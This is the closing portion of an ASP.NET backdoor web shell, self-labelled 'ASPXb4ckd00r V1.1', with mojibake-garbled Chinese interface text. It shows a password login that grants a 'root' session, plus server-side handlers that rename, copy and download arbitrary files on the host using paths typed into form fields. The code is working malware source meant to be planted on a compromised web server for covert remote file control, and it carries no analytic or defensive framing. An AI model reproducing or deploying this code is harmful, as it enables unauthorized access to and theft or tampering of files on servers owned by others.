        ������:<asp:TextBox ID="TextBoxRename" runat="server" Width="495px"></asp:TextBox><br />
        Ϊ: &nbsp; &nbsp; &nbsp;&nbsp;
        <asp:TextBox ID="TextBoxRenameTo" runat="server" Width="495px"></asp:TextBox>
        <asp:Button ID="ButtonRename" runat="server" OnClick="ButtonRename_Click" Text="������" /><br />
        </form>
        <table>
        <script runat="server">
            protected void ButtonRename_Click(object sender, EventArgs e)
            {
                File.Move(TextBoxRename.Text.ToString(),TextBoxRenameTo.Text.ToString());
                TextBoxRenameTo.Text = "";
            }
        </script>
    <%
    }

    if (action == "copy" && (Session["root"] != null))
    {
        TextBoxCopy.Text = src;
   %>
        <form id="Form9" runat="server">
        <table align="center">
        ��:<asp:TextBox ID="TextBoxCopy" runat="server" Width="469px"></asp:TextBox><br />
        ��:<asp:TextBox ID="TextBoxCopyTo" runat="server" Width="468px"></asp:TextBox>&nbsp;
        <asp:Button ID="ButtonCopy" runat="server" OnClick="ButtonCopy_Click" Text=" ����" />
        </table>
        </form>
        <script runat="server">
            protected void ButtonCopy_Click(object sender, EventArgs e)
            {
                string old = TextBoxCopy.Text;
                string news = TextBoxCopyTo.Text;
                File.Copy(old, news, true);

            }
        </script>
<%
    }

    else if (action == "down" && (Session["root"] != null))
    {
        DownFile(src);
    
        %>
 

<html>
<head id="Head1" runat="server">
    <title></title>
<script runat="server">
    public ArrayList al = new ArrayList();

    protected void Page_Load(object sender, EventArgs e)
    {
        Response.Write("<title>��ȫ����ASP.Net ���� Ver1.1 </title>");

    }
</script>

</head>
<body>

</body>
</html>
<% }
   }
else
{
%>
<center>
    <form id="Form10" runat="server"> 
    /*Login Page*/</p>
    /*You Must Use "Enter" to Login.*/</p>
    /*Coded In Visual C# 2005 By:Char For Security*/</p>
    <table>
    <tr>
    <td><asp:TextBox ID="pass" runat="server" TextMode="Password"></asp:TextBox></td>
    <td><asp:Button ID="Login" runat="server" OnClick="Login_Click" Text="��¼" Width="56px" Height="26px"/></td>
    </tr>
    </table>
    </form>
        <script runat="server">
            void Login_Click(object sender, EventArgs e)
        {
            if (pass.Text == PWD)
            {
                Session["root"] = 1;
                Session.Timeout = 90;
                Response.Redirect(Request.Url+"?page=index&src="+ Server.MapPath(".")+"\\");
            }
            else
                Response.Write("�������");
        }
    </script>
   <% 
    } 
   %>
    <hr>
    <table align="center">ASPXb4ckd00r V1.1 By:Char</table>
    </table></center>